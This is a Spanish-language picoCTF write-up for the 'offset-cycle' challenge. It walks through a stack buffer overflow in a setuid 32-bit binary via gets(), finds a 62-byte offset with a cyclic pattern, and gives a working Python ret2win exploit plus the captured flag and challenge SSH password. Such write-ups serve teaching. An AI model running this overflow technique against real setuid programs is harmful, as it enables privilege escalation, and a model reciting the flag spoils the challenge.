# offset-cycle - picoCTF Binary Exploit

## Información del Reto
- **Nombre:** offset-cycle
- **Autor:** Aditya Sudhansu
- **Categoría:** Binary Exploitation (Buffer Overflow)
- **Conexión:** `ssh -p 56161 ctf-player@green-hill.picoctf.net` (password: `fa005713`)

## Flag
```
picoCTF{u_Us3d_pwNt00L5_bff09aaa}
```

## Análisis

### Reconocimiento
Al conectar por SSH, encontramos:
- Un binario `start` que genera un archivo `.c` aleatorio y lo compila
- El binario resultante es **ELF 32-bit LSB executable, Intel 80386**, con **setuid root**
- Tenemos 120 segundos para explotar el binario antes de que se elimine

### Código Fuente Vulnerable
```c
void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("CodeBank/flag.txt","r");
  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];  // BUFSIZE = 50
  gets(buf);          // <-- VULNERABLE: sin límite de lectura
  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}
```

### Vulnerabilidad
- **Buffer overflow clásico** mediante `gets()` que no limita la cantidad de bytes leídos
- El buffer `buf` está en `ebp - 0x3a` (58 bytes desde ebp)
- La función `win()` existe pero nunca es llamada desde el flujo normal

### Determinación del Offset
Usando un patrón cíclico de pwntools:
- El return address se sobreescribió con `0x61716161`
- `cyclic_find(0x61716161)` = **62 bytes** de offset hasta el return address

### Dirección Objetivo
- `win()` está en `0x080491f6` (obtenido con `objdump -d`)

## Exploit
```python
import struct, sys
padding = b'A' * 62
ret_addr = struct.pack('<I', 0x080491f6)
sys.stdout.buffer.write(padding + ret_addr + b'\n')
```

### Ejecución
```bash
python3 -c "
import struct, sys
padding = b'A' * 62
ret_addr = struct.pack('<I', 0x080491f6)
sys.stdout.buffer.write(padding + ret_addr + b'\n')
" | ./8
```

### Resultado
```
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{u_Us3d_pwNt00L5_bff09aaa}
```
